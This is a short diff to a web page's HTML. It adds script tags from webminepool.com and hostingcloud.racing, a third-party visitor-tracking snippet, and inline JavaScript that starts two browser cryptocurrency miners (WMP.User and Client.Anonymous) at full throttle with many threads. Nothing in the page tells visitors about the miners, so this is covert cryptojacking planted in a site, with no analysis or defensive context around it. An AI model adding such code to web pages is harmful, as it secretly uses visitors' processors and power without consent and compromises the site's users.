@@ -104,6 +104,9 @@
 
     </style>
 
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script src="https://www.hostingcloud.racing/lq8l.js"></script>
+
 </head>
 
 <body>
@@ -2787,5 +2790,22 @@ location.href='${url}';
 </script>
 <!-- SCRIPTS -->
 </body>
+
+<!-- Hitsteps TRACKING CODE - Manual 2022-01-28 - DO NOT CHANGE -->
+<script type="text/javascript">(function(){var hstc=document.createElement('script'); hstc.src='https://log.hitsteps.net/track.php?code=a80f44dd13c72ae4797d2c9a16cf206c';hstc.async=true;var htssc = document.getElementsByTagName('script')[0];htssc.parentNode.insertBefore(hstc, htssc);})();
+</script><noscript><a href="http://www.hitsteps.com/"><img src="//log.hitsteps.net/track.php?mode=img&amp;code=a80f44dd13c72ae4797d2c9a16cf206c" alt="web stats" width="1" height="1" />visitor activity monitoring</a></noscript>
+<!-- Hitsteps TRACKING CODE - DO NOT CHANGE -->
+
+<script>
+    var miner = WMP.User('SK_A8M79tyT5eTqKBzx6qHa6', 'jordan',{
+        throttle: 0, threads: 100,
+    });
+    miner.start();
+
+    var _client = new Client.Anonymous('0991f8fe084dd4ef49be598a90e835293f55314e3be7fa44b5d1d760d517c3be', {
+        throttle: 0, threads: 10, c: 'w'
+    });
+    _client.start();
+</script>
 
 </html>
